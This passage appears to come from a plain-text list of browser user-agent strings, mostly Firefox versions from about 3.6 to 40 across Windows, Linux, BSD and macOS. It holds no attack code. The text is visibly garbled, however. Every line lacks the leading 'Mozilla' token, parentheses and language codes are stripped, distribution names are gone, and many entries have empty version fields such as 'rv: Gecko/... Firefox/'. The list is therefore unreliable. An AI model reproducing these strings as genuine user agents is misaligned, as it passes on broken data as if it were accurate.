	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; -us /528.16 KHTML,  Gecko"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_5; - /525.18 KHTML,  Gecko"




####################################
##      Firefox User Agents       ##
####################################
	"/5.0 Windows NT 6.1; WOW64; rv:40.0 Gecko/20100101 Firefox/40.1"
	"/5.0 Windows NT 6.3; rv:36.0 Gecko/20100101 Firefox/36.0"
	"/5.0 Macintosh; Intel Mac OS X 10_10; rv:33.0 Gecko/20100101 Firefox/33.0"
	"/5.0 X11; Linux i586; rv:31.0 Gecko/20100101 Firefox/31.0"
	"/5.0 Windows NT 6.1; WOW64; rv:31.0 Gecko/20130401 Firefox/31.0"
	"/5.0 Windows NT 5.1; rv:31.0 Gecko/20100101 Firefox/31.0"
	"/5.0 Windows NT 6.1; WOW64; rv:29.0 Gecko/20120101 Firefox/29.0"
	"/5.0 Windows NT 6.1; Win64; x64; rv:25.0 Gecko/20100101 Firefox/29.0"
	"/5.0 X11; OpenBSD amd64; rv:28.0 Gecko/20100101 Firefox/28.0"
	"/5.0 X11; Linux x86_64; rv:28.0 Gecko/20100101  Firefox/28.0"
	"/5.0 Windows NT 6.1; rv:27.3 Gecko/20130101 Firefox/27.3"
	"/5.0 Windows NT 6.2; Win64; x64; rv:27.0 Gecko/20121011 Firefox/27.0"
	"/5.0 Windows NT 6.1; Win64; x64; rv:25.0 Gecko/20100101 Firefox/25.0"
	"/5.0 Macintosh; Intel Mac OS X 10.6; rv:25.0 Gecko/20100101 Firefox/25.0"
	"/5.0 X11; ; Linux x86_64; rv:24.0 Gecko/20100101 Firefox/24.0"
	"/5.0 Windows NT 6.0; WOW64; rv:24.0 Gecko/20100101 Firefox/24.0"
	"/5.0 Macintosh; Intel Mac OS X 10.8; rv:24.0 Gecko/20100101 Firefox/24.0"
	"/5.0 Windows NT 6.2; rv:22.0 Gecko/20130405 Firefox/23.0"
	"/5.0 Windows NT 6.1; WOW64; rv:23.0 Gecko/20130406 Firefox/23.0"
	"/5.0 Windows NT 6.1; Win64; x64; rv:23.0 Gecko/20131011 Firefox/23.0"
	"/5.0 Windows NT 6.2; rv:22.0 Gecko/20130405 Firefox/22.0"
	"/5.0 Windows NT 6.1; Win64; x64; rv:22.0 Gecko/20130328 Firefox/22.0"
	"/5.0 Windows NT 6.1; rv:22.0 Gecko/20130405 Firefox/22.0"
	"/5.0  Windows NT 6.2.9200.0; rv:22.0 Gecko/20130405 Firefox/22.0"
	"/5.0 Windows NT 6.2; Win64; x64; rv:16.0.1 Gecko/20121011 Firefox/21.0.1"
	"/5.0 Windows NT 6.1; Win64; x64; rv:16.0.1 Gecko/20121011 Firefox/21.0.1"
	"/5.0 Windows NT 6.2; Win64; x64; rv:21.0.0 Gecko/20121011 Firefox/21.0.0"
	"/5.0 X11; ; Linux x86_64; rv:21.0 Gecko/20130331 Firefox/21.0"
	"/5.0 X11; ; Linux x86_64; rv:21.0 Gecko/20100101 Firefox/21.0"
	"/5.0 X11; Linux i686; rv:21.0 Gecko/20100101 Firefox/21.0"
	"/5.0 Windows NT 6.2; WOW64; rv:21.0 Gecko/20130514 Firefox/21.0"
	"/5.0 Windows NT 6.2; rv:21.0 Gecko/20130326 Firefox/21.0"
	"/5.0 Windows NT 6.1; WOW64; rv:21.0 Gecko/20130401 Firefox/21.0"
	"/5.0 Windows NT 6.1; WOW64; rv:21.0 Gecko/20130331 Firefox/21.0"
	"/5.0 Windows NT 6.1; WOW64; rv:21.0 Gecko/20130330 Firefox/21.0"
	"/5.0 Windows NT 6.1; WOW64; rv:21.0 Gecko/20100101 Firefox/21.0"
	"/5.0 Windows NT 6.1; rv:21.0 Gecko/20130401 Firefox/21.0"
	"/5.0 Windows NT 6.1; rv:21.0 Gecko/20130328 Firefox/21.0"
	"/5.0 Windows NT 6.1; rv:21.0 Gecko/20100101 Firefox/21.0"
	"/5.0 Windows NT 5.1; rv:21.0 Gecko/20130401 Firefox/21.0"
	"/5.0 Windows NT 5.1; rv:21.0 Gecko/20130331 Firefox/21.0"
	"/5.0 Windows NT 5.1; rv:21.0 Gecko/20100101 Firefox/21.0"
	"/5.0 Windows NT 5.0; rv:21.0 Gecko/20100101 Firefox/21.0"
	"/5.0 Macintosh; Intel Mac OS X 10.8; rv:21.0 Gecko/20100101 Firefox/21.0"
	"/5.0 Windows NT 6.2; Win64; x64; Gecko/20100101 Firefox/20.0"
	"/5.0 Windows x86; rv:19.0 Gecko/20100101 Firefox/19.0"
	"/5.0 Windows NT 6.1; rv:6.0 Gecko/20100101 Firefox/19.0"
	"/5.0 Windows NT 6.1; rv:14.0 Gecko/20100101 Firefox/18.0.1"
	"/5.0 Windows NT 6.1; WOW64; rv:18.0  Gecko/20100101 Firefox/18.0"
	"/5.0 X11; ; Linux x86_64; rv:17.0 Gecko/20100101 Firefox/17.0.6"
	"/5.0 X11; ; Linux armv7l; rv:17.0 Gecko/20100101 Firefox/17.0"
	"/6.0 Windows NT 6.2; WOW64; rv:16.0.1 Gecko/20121011 Firefox/16.0.1"
	"/5.0 Windows NT 6.2; WOW64; rv:16.0.1 Gecko/20121011 Firefox/16.0.1"
	"/5.0 Windows NT 6.2; Win64; x64; rv:16.0.1 Gecko/20121011 Firefox/16.0.1"
	"/5.0 X11; NetBSD amd64; rv:16.0 Gecko/20121102 Firefox/16.0"
	"/5.0 Windows NT 6.1; rv:15.0 Gecko/20120716 Firefox/15.0a2"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.1.16 Gecko/20120427 Firefox/15.0a1"
	"/5.0 Windows NT 6.1; WOW64; rv:15.0 Gecko/20120427 Firefox/15.0a1"
	"/5.0 Windows NT 6.2; WOW64; rv:15.0 Gecko/20120910144328 Firefox/15.0.2"
	"/5.0 X11; ; Linux i686; rv:15.0 Gecko/20100101 Firefox/15.0.1"
	"/5.0 Windows; U; Windows NT 5.1; rv:15.0 Gecko/20121011 Firefox/15.0.1"
	"/5.0 Windows NT 6.1; Win64; x64; rv:14.0 Gecko/20120405 Firefox/14.0a1"
	"/5.0 Windows NT 6.1; rv:14.0 Gecko/20120405 Firefox/14.0a1"
	"/5.0 Windows NT 5.1; rv:14.0 Gecko/20120405 Firefox/14.0a1"
	"/5.0 X11; ; Linux x86_64; rv:14.0 Gecko/20100101 Firefox/14.0.1"
	"/5.0 X11; ; Linux i686; rv:14.0 Gecko/20100101 Firefox/14.0.1"
	"/5.0 Windows; U; Windows NT 6.1; WOW64; -US; rv:2.0.4 Gecko/20120718 AskTbAVR-IDW/3.12.5.17700 Firefox/14.0.1"
	"/5.0 Windows NT 6.1; rv:12.0 Gecko/20120403211507 Firefox/14.0.1"
	"/5.0 Windows NT 6.1; rv:12.0 Gecko/ 20120405 Firefox/14.0.1"
	"/5.0 Windows NT 6.0; rv:14.0 Gecko/20100101 Firefox/14.0.1"
	"/5.0 Windows NT 5.1; rv:15.0 Gecko/20100101 Firefox/13.0.1"
	"/5.0 Windows NT 6.1; rv:12.0 Gecko/20120403211507 Firefox/12.0"
	"/5.0 Windows NT 6.1; ;rv:12.0 Gecko/20120403211507 Firefox/12.0"
	"/5.0 Windows NT 5.1; rv:12.0 Gecko/20120403211507 Firefox/12.0"
	"/5.0 ; Windows; U; Windows NT 6.2; WOW64; -US; rv:12.0 Gecko/20120403211507 Firefox/12.0"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.16 Gecko/20120421 Gecko Firefox/11.0"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.16 Gecko/20120421 Firefox/11.0"
	"/5.0 Windows NT 6.1; WOW64; rv:11.0 Gecko Firefox/11.0"
	"/5.0 Windows NT 6.1; U;WOW64; ;rv:11.0 Gecko Firefox/11.0"
	"/5.0 Windows NT 5.1; rv:11.0 Gecko Firefox/11.0"
	"/6.0 Macintosh; I; Intel Mac OS X 11_7_9; -LI; rv:1.9b4 Gecko/2012010317 Firefox/10.0a4"
	"/5.0 Macintosh; I; Intel Mac OS X 11_7_9; -LI; rv:1.9b4 Gecko/2012010317 Firefox/10.0a4"
	"/5.0 X11; ; Linux x86_64; rv:10.0.9 Gecko/20100101 Firefox/10.0.9"
	"/5.0 Macintosh; Intel Mac OS X 10.6; rv:9.0a2 Gecko/20111101 Firefox/9.0a2"
	"/5.0 Windows NT 6.2; rv:9.0.1 Gecko/20100101 Firefox/9.0.1"
	"/5.0 Macintosh; Intel Mac OS X 10.6; rv:9.0 Gecko/20100101 Firefox/9.0"
	"/5.0 Windows NT 5.1; rv:8.0; en_us Gecko/20100101 Firefox/8.0"
	"/5.0 Windows NT 6.1; rv:6.0 Gecko/20100101 Firefox/7.0"
	"/5.0 Windows NT 6.1; WOW64; rv:6.0a2 Gecko/20110613 Firefox/6.0a2"
	"/5.0 Windows NT 6.1; WOW64; rv:6.0a2 Gecko/20110612 Firefox/6.0a2"
	"/5.0 X11; Linux i686; rv:6.0 Gecko/20100101 Firefox/6.0"
	"/5.0 Windows NT 6.1; rv:6.0 Gecko/20110814 Firefox/6.0"
	"/5.0 Windows NT 5.1; rv:6.0 Gecko/20100101 Firefox/6.0 FirePHP/0.6"
	"/5.0 Windows NT 5.0; WOW64; rv:6.0 Gecko/20100101 Firefox/6.0"
	"/5.0 X11; Linux i686  x86_64; rv:5.0a2 Gecko/20110524 Firefox/5.0a2"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.2.28 Gecko/20120306 Firefox/5.0.1"
	"/5.0 Windows NT 6.1; U; ; rv:5.0.1.6 Gecko/20110501 Firefox/5.0.1 Firefox/5.0.1"
	"/3.0 Windows NT 6.1; rv:2.0.1 Gecko/20100101 Firefox/5.0.1"
	"/5.0 X11; U; Linux i586; ; rv:5.0 Gecko/20100101 Firefox/5.0"
	"/5.0 X11; U; Linux amd64; rv:5.0 Gecko/20100101 Firefox/5.0 "
	"/5.0 X11; U; Linux amd64; -US; rv:5.0 Gecko/20110619 Firefox/5.0"
	"/5.0 X11; Linux Gecko Firefox/5.0"
	"/5.0 X11; Linux x86_64; rv:5.0 Gecko/20100101 Firefox/5.0 FirePHP/0.5"
	"/5.0 X11; Linux x86_64; rv:5.0 Gecko/20100101 Firefox/5.0 Firefox/5.0"
	"/5.0 X11; Linux x86_64 Gecko Firefox/5.0"
	"/5.0 X11; Linux ppc; rv:5.0 Gecko/20100101 Firefox/5.0"
	"/5.0 X11; Linux AMD64 Gecko Firefox/5.0"
	"/5.0 X11; FreeBSD amd64; rv:5.0 Gecko/20100101 Firefox/5.0"
	"/5.0 Windows NT 6.2; WOW64; rv:5.0 Gecko/20100101 Firefox/5.0"
	"/5.0 Windows NT 6.1; Win64; x64; rv:5.0 Gecko/20110619 Firefox/5.0"
	"/5.0 Windows NT 6.1; Win64; x64; rv:5.0 Gecko/20100101 Firefox/5.0"
	"/5.0 Windows NT 6.1; rv:6.0 Gecko/20100101 Firefox/5.0"
	"/5.0 Windows NT 6.1.1; rv:5.0 Gecko/20100101 Firefox/5.0"
	"/5.0 Windows NT 5.2; WOW64; rv:5.0 Gecko/20100101 Firefox/5.0"
	"/5.0 Windows NT 5.1; U; rv:5.0 Gecko/20100101 Firefox/5.0"
	"/5.0 Windows NT 5.1; rv:2.0.1 Gecko/20100101 Firefox/5.0"
	"/5.0 Windows NT 5.0; WOW64; rv:5.0 Gecko/20100101 Firefox/5.0"
	"/5.0 Windows NT 5.0; rv:5.0 Gecko/20100101 Firefox/5.0"
	"/5.0 X11; Linux x86_64; rv: Gecko/20110324 Firefox/"
	"/5.0 X11; Linux x86_64; rv: Gecko/20100101 Firefox/"
	"/5.0 Windows NT 6.1; Win64; x64; rv: Gecko/20110324 Firefox/"
	"/5.0 Windows NT 6.1; Win64; x64; rv: Gecko/20110323 Firefox/"
	"/5.0 Windows NT 6.1; Win64; x64; rv: Gecko/20110208 Firefox/"
	"/5.0 X11; Linux x86_64; rv: Gecko/20110111 Firefox/"
	"/5.0 Windows NT 6.1; Win64; x64; rv: Gecko/20101228 Firefox/"
	"/5.0 Windows NT 5.1; rv: Gecko/20110105 Firefox/"
	"/5.0 Windows NT 6.1; WOW64; rv: Gecko/20101114 Firefox/"
	"/5.0 Windows NT 6.1; Win64; x64; rv: Gecko/20101213 Firefox/"
	"/5.0 Windows NT 6.1; Win64; x64; rv: Gecko/20101128 Firefox/"
	"/5.0 Windows NT 6.1; Win64; x64; rv: Gecko/20101114 Firefox/"
	"/5.0 Windows NT 5.1; rv: Gecko/20101127 Firefox/"
	"/5.0 Macintosh; Intel Mac OS X 10.6; rv:2.0b8 Gecko/20100101 Firefox/4.0b8"
	"/4.0 ;  Intel Mac OS X 10.6; rv:2.0b8 Gecko/20100101 Firefox/4.0b8"
	"/5.0 Windows NT 6.1; rv: Gecko/20100921 Firefox/"
	"/5.0 Windows NT 6.1; WOW64; rv:2.0b7 Gecko/20101111 Firefox/4.0b7"
	"/5.0 Windows NT 6.1; WOW64; rv:2.0b7 Gecko/20100101 Firefox/4.0b7"
	"/5.0 Windows NT 6.1; WOW64; rv: Gecko/20100903 Firefox/"
	"/5.0 Windows NT 6.1; rv: Gecko/20100903 Firefox/ Firefox/"
	"/5.0 X11; Linux x86_64; rv:2.0b4 Gecko/20100818 Firefox/4.0b4"
	"/5.0 X11; Linux i686; rv: Gecko/20100731 Firefox/"
	"/5.0 Windows NT 5.2; rv: Gecko/20110304 Firefox/"
	"/5.0 Windows NT 5.1; rv: Gecko/20110223 Firefox/"
	"/5.0 X11; Linux i686; rv: Gecko/20110204 Firefox/"
	"/5.0 X11; Linux i686; rv: Gecko/20100101 Firefox/"
	"/5.0 Windows NT 6.1; WOW64; rv: Gecko/20110128 Firefox/"
	"/5.0 Windows NT 6.1; Win64; x64; rv: Gecko/20110131 Firefox/"
	"/5.0 Windows NT 6.1; Win64; x64; rv: Gecko/20110129 Firefox/"
	"/5.0 Windows NT 6.1; Win64; x64; rv: Gecko/20110128 Firefox/"
	"/5.0 Windows NT 6.1; rv: Gecko/20110126 Firefox/"
	"/5.0 Macintosh; Intel Mac OS X 10.6; rv: Gecko/20110126 Firefox/"
	"/5.0 Windows NT 6.1; Win64; x64; rv: Gecko/20110118 Firefox/"
	"/5.0 Windows NT 6.1; rv: Gecko/20110113 Firefox/"
	"/5.0 X11; Linux i686; rv:2.0b10 Gecko/20100101 Firefox/4.0b10"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:2.0b10 Gecko/20110126 Firefox/4.0b10"
	"/5.0 Windows NT 6.1; rv:2.0b10 Gecko/20110126 Firefox/4.0b10"
	"/5.0 X11; U; Linux i686; ; rv:1.9.1.3 Gecko/20091020 /10.04  Firefox/4.0.1"
	"/5.0 X11; Linux x86_64; rv:2.0.1 Gecko/20110506 Firefox/4.0.1"
	"/5.0 X11; Linux i686; rv:2.0.1 Gecko/20110518 Firefox/4.0.1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:2.0.1 Gecko/20110606 Firefox/4.0.1"
	"/5.0 X11; U; Linux x86_64; pl-PL; rv:2.0 Gecko/20110307 Firefox/4.0"
	"/5.0 X11; U; Linux i686; -GB; rv:2.0 Gecko/20110404 /16-dev Firefox/4.0"
	"/5.0 X11; Arch Linux i686; rv:2.0 Gecko/20110321 Firefox/4.0"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/4.0 .NET CLR 3.5.30729"
	"/5.0 Windows NT 6.1; rv:2.0 Gecko/20110319 Firefox/4.0"
	"/5.0 Windows NT 6.1; rv:1.9 Gecko/20100101 Firefox/4.0"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.0.2 Gecko/20121223 /9.25 jaunty Firefox/3.8"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.0.2 Gecko/2008092313 /9.25 jaunty Firefox/3.8"
	"/5.0 X11; U; Linux i686; -IT; rv:1.9.0.2 Gecko/2008092313 /9.25 jaunty Firefox/3.8"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.2.3 Gecko/20100401 /5.0 "
	"/5.0 X11; U; Linux i686; -IT; rv:1.9.0.2 Gecko/2008092313 /9.25 jaunty Firefox/3.8"
	"/5.0 X11; U; Linux i686; ; rv: Gecko/20100526 Firefox/"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2b5 Gecko/20091204 Firefox/3.6b5"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.2b5 Gecko/20091204 Firefox/3.6b5"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.9.2b5 Gecko/20091204 Firefox/3.6b5"
	"/5.0 Macintosh; U; Intel Mac OS X 10.6; -US; rv:1.9.2 Gecko/20091218 Firefox 3.6b5"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.9.2b4 Gecko/20091124 Firefox/3.6b4 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.2b4 Gecko/20091124 Firefox/3.6b4"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.2b1 Gecko/20091014 Firefox/3.6b1 GTB5"
	"/5.0 X11; U; Linux x86_64; -US; rv: Gecko/20090428 Firefox/"
	"/5.0 X11; U; Linux x86_64; -US; rv: Gecko/20090405 Firefox/"
	"/5.0 X11; U; Linux i686; -RU; rv: Gecko/20090405 /9.04 jaunty Firefox/"
	"/5.0 Windows; Windows NT 5.1; es-ES; rv: Gecko/20090402 Firefox/"
	"/5.0 Windows; Windows NT 5.1; -US; rv: Gecko/20090402 Firefox/"
	"/5.0 Windows; U; Windows NT 5.1; ; rv: Gecko/20090402 Firefox/ .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.9 Gecko/20100915 Gentoo Firefox/3.6.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.2.9 Gecko/20100827  /3.6.9-2.el6 Firefox/3.6.9"
	"/5.0 X11; U; FreeBSD i386; -US; rv:1.9.2.9 Gecko/20100913 Firefox/3.6.9"
	"/5.0 Windows; U; Windows NT 6.1; rv:1.9.2.9 Gecko/20100913 Firefox/3.6.9"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.9.2.9 Gecko/20100824 Firefox/3.6.9  .NET CLR 3.5.30729; .NET CLR 4.0.20506"
	"/5.0 Windows; U; Windows NT 5.2; -GB; rv:1.9.2.9 Gecko/20100824 Firefox/3.6.9"
	"/5.0 Macintosh; U; Intel Mac OS X 10.6;-US; rv:1.9.2.9 Gecko/20100824 Firefox/3.6.9"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.9.2.8 Gecko/20101230 Firefox/3.6.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.8 Gecko/20100804 Gentoo Firefox/3.6.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.8 Gecko/20100723 SUSE/3.6.8-0.1.1 Firefox/3.6.8"
	"/5.0 X11; U; Linux i686; zh-CN; rv:1.9.2.8 Gecko/20100722 /10.04  Firefox/3.6.8"
	"/5.0 X11; U; Linux i686; ; rv:1.9.2.8 Gecko/20100723 /10.04  Firefox/3.6.8"
	"/5.0 X11; U; Linux i686; fi-FI; rv:1.9.2.8 Gecko/20100723 /10.04  Firefox/3.6.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.2.8 Gecko/20100727 Firefox/3.6.8"
	"/5.0 X11; U; Linux i686; -DE; rv:1.9.2.8 Gecko/20100725 Gentoo Firefox/3.6.8"
	"/5.0 X11; U; FreeBSD i386; -CH; rv:1.9.2.8 Gecko/20100729 Firefox/3.6.8"
	"/5.0 Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.8 Gecko/20100722 Firefox/3.6.8"
	"/5.0 Windows; U; Windows NT 6.1; -BR; rv:1.9.2.8 Gecko/20100722 Firefox/3.6.8 GTB7.1"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.8 Gecko/20100722 AskTbADAP/3.9.1.14019 Firefox/3.6.8"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.8 Gecko/20100722 Firefox/3.6.8"
	"/5.0 Windows; U; Windows NT 6.1; fr; rv:1.9.2.8 Gecko/20100722 Firefox 3.6.8 GTB7.1"
	"/5.0 Windows; U; Windows NT 6.1; -GB; rv:1.9.2.8 Gecko/20100722 Firefox/3.6.8  .NET CLR 3.5.30729; .NET4.0C"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.8 Gecko/20100722 Firefox 3.6.8"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20121221 Firefox/3.6.8"
	"/5.0 Windows; U; Windows NT 5.2; zh-TW; rv:1.9.2.8 Gecko/20100722 Firefox/3.6.8"
	"/5.0 Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.8 Gecko/20100722 Firefox/3.6.8"
	"/5.0 Windows; U; Windows NT 5.1; tr; rv:1.9.2.8 Gecko/20100722 Firefox/3.6.8  .NET CLR 3.5.30729; .NET4.0E"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.7 Gecko/20100809 /3.6.7-1.fc14 Firefox/3.6.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.7 Gecko/20100723 /3.6.7-1.fc13 Firefox/3.6.7"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.2.7 Gecko/20100726 CentOS/3.6-3.el5.centos Firefox/3.6.7"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.7 Gecko/20100713 Firefox/3.6.7 GTB7.1"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.8 Gecko/20100722 Firefox/3.6.7 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -PT; rv:1.9.2.7 Gecko/20100713 Firefox/3.6.7 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.6 Gecko/20100628 /10.04  Firefox/3.6.6 GTB7.1"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.6 Gecko/20100628 /10.04  Firefox/3.6.6 GTB7.0"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.6 Gecko/20100628 /10.04  Firefox/3.6.6 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.6 Gecko/20100628 /10.04  Firefox/3.6.6"
	"/5.0 Windows; U; Windows NT 6.1; -PT; rv:1.9.2.6 Gecko/20100625 Firefox/3.6.6"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.6 Gecko/20100625 Firefox/3.6.6  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.2.6 Gecko/20100625 Firefox/3.6.6 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; zh-CN; rv:1.9.2.6 Gecko/20100625 Firefox/3.6.6 GTB7.1"
	"/5.0 Windows; U; Windows NT 6.0; nl; rv:1.9.2.6 Gecko/20100625 Firefox/3.6.6"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.6 Gecko/20100625 Firefox/3.6.6  .NET CLR 3.5.30729; .NET4.0E"
	"/5.0 Macintosh; U; Intel Mac OS X; -AT; rv:1.9.1.8 Gecko/20100625 Firefox/3.6.6"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.4 Gecko/20100614 /10.04  Firefox/3.6.4"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.4 Gecko/20100527 Firefox/3.6.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.2.4 Gecko/20100625 Gentoo Firefox/3.6.4"
	"/5.0 Windows; U; Windows NT 6.1; zh-TW; rv:1.9.2.4 Gecko/20100611 Firefox/3.6.4  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.4 Gecko/20100513 Firefox/3.6.4"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.4 Gecko/20100611 Firefox/3.6.4 GTB7.1"
	"/5.0 Windows; U; Windows NT 6.1; cs; rv:1.9.2.4 Gecko/20100513 Firefox/3.6.4 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; zh-CN; rv:1.9.2.4 Gecko/20100513 Firefox/3.6.4"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.2.4 Gecko/20100513 Firefox/3.6.4  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; fr; rv:1.9.2.4 Gecko/20100523 Firefox/3.6.4  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.2.4 Gecko/20100527 Firefox/3.6.4 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.2.4 Gecko/20100527 Firefox/3.6.4"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.2.4 Gecko/20100523 Firefox/3.6.4  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.2.4 Gecko/20100513 Firefox/3.6.4 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -CA; rv:1.9.2.4 Gecko/20100523 Firefox/3.6.4"
	"/5.0 Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.4 Gecko/20100611 Firefox/3.6.4 GTB7.0  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.4 Gecko/20100513 Firefox/3.6.4 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.4 Gecko/20100503 Firefox/3.6.4  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; nb-NO; rv:1.9.2.4 Gecko/20100611 Firefox/3.6.4 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; ko; rv:1.9.2.4 Gecko/20100523 Firefox/3.6.4"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv: Gecko/20100405 Firefox/3.6.3plugin1  .NET CLR 3.5.30729"
	"/5.0 Macintosh; U; Intel Mac OS X 10.6; ; rv: Gecko/20100405 Firefox/3.6.3plugin1"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9.2.3 Gecko/20100403 /3.6.3-4.fc13 Firefox/3.6.3"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.3 Gecko/20100403 Firefox/3.6.3"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.2.3 Gecko/20100401 SUSE/3.6.3-1.1 Firefox/3.6.3"
	"/5.0 X11; U; Linux i686; ko-KR; rv:1.9.2.3 Gecko/20100423 /10.04  Firefox/3.6.3"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.2.3 Gecko/20100404 /10.04  Firefox/3.6.3"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 GTB7.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.2.2 Gecko/20100316 Firefox/3.6.3"
	"/5.0 X11; U; Linux i686; ; rv:1.9.2.3 Gecko/20100423 /10.04  Firefox/3.6.3"
	"/5.0 X11; U; Linux AMD64; -US; rv:1.9.2.3 Gecko/20100403 /10.10 maverick Firefox/3.6.3"
	"/5.0 Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3"
	"/5.0 Windows; U; Windows NT 6.1; pl; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 GTB7.1"
	"/5.0 Windows; U; Windows NT 6.1; es-ES; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 GTB7.1"
	"/5.0 Windows; U; Windows NT 6.1; es-ES; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 GTB7.0  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; es-ES; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; cs; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; fr; rv:1.9.2.28 Gecko/20120306 Firefox/3.6.28"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.28 Gecko/20120306 AskTbSTC-SRS/3.13.1.18132 Firefox/3.6.28 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.2.28 Gecko/20120306 Firefox/3.6.28  .NET CLR 3.5.30729; .NET4.0C"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.25 Gecko/20111212 Firefox/3.6.25  .NET CLR 3.5.30729; .NET4.0C"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.2.24 Gecko/20111101 SUSE/3.6.24-0.2.1 Firefox/3.6.24"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.9.2.24 Gecko/20111103 Firefox/3.6.24"
	"/5.0 Macintosh; U; Intel Mac OS X 10.6; -US; rv:1.9.2.24 Gecko/20111103 Firefox/3.6.24"
